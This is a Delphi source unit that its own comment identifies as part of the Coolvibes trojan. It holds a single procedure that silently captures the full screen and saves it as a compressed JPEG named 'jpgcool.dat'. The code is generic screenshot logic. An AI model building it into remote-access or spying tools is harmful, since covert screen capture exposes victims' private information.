{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en la captura de pantalla}
unit unitCapScreen;

interface

uses
  Windows,
  SysUtils,
  Graphics,
  Jpeg,
  UnitFunciones;

procedure CapturarPantalla(NivelCompresion: integer);

implementation

procedure CapturarPantalla(NivelCompresion: integer);
var
  ScreenCap: TBitmap;
  Jpg: TjpegImage;
begin
  ScreenCap := TBitmap.Create;
  ScreenCap.Width := AnchuraPantalla();
  ScreenCap.Height := AlturaPantalla();
  BitBlt(ScreenCap.Canvas.handle, 0, 0, ScreenCap.Width, ScreenCap.Height,
    GetDc(0), 0, 0, SRCCOPY);
  Jpg := TjpegImage.Create;
  Jpg.Assign(ScreenCap);
  ScreenCap.Free;
  Jpg.CompressionQuality := NivelCompresion;
  Jpg.Compress;
  Jpg.SaveToFile(ExtractFilePath(ParamStr(0)) + 'jpgcool.dat');
  Jpg.Free;
end;

end.
